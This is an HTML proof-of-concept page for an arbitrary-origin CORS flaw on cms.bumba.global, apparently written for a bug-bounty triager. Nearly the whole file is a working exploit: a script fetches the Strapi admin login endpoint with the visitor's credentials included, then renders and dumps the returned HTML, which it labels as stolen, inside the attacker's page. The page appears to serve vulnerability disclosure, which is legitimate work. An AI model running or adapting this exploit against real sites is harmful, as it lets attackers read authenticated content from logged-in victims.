<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>CORS PoC – cms.bumba.global</title>
    <style>
      body { font-family: system-ui, sans-serif; margin: 0; padding: 1rem; }
      h2   { margin-top: 0; }
      iframe { width: 100%; height: 600px; border: 1px solid #aaa; }
      pre { background: #f6f8fa; padding: .75rem; overflow-x: auto; }
    </style>
  </head>
  <body>
    <h2>Arbitrary‑Origin CORS PoC<br>
      <small>(Rendered Strapi Admin / Login inside attacker origin)</small>
    </h2>

    <!-- Where we’ll inject the HTML we steal -->
    <iframe id="viewer" title="Stolen Admin HTML"></iframe>

    <!-- Fallback raw dump -->
    <h3>Raw response (for triagers who block iframes):</h3>
    <pre id="dump">loading…</pre>

    <script>
      // 1. Cross‑origin request with credentials
      fetch('https://cms.bumba.global/admin/auth/login', {
        credentials: 'include'
      })
      .then(res => res.text())
      .then(html => {
        // 2. Show the HTML inside an iframe so it renders
        document.getElementById('viewer').srcdoc = html;
        // 3. Also dump raw HTML so headers/body are easy to verify
        document.getElementById('dump').textContent = html.slice(0, 2000) + 
          (html.length > 2000 ? '\n…(truncated)…' : '');
      })
      .catch(err => {
        document.getElementById('dump').textContent = 'Error: ' + err;
      });
    </script>
  </body>
</html>
